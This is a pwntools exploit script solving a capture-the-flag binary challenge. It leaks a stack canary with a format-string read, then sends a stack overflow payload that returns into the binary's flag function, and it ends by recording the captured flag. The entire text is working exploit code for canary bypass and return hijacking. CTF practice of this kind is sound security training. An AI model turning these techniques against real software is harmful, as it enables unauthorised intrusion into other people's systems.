from pwn import *
elf = context.binary = ELF("./yapping")
p = process()
# p = remote("ctf-chall.stembascc.com",6056)
offset = 72
p.sendline("%15$p")
p.recvuntil(b"oaoaoaoa")
canary = int(p.recvline().strip().decode(),16)
p.sendline("exit")
payload = b"A" * offset + p64(canary) + b"A" * 8 + p64(0x0000000000401016) + p64(elf.sym['flag'])
p.sendline(payload)
print(p.recvline().strip().decode())
print(p.recvline().strip().decode())

# Flag: SIJAWARA{o4o4o4o4o4o4_byp45s_C4naRy_n0_D3bugg3r}
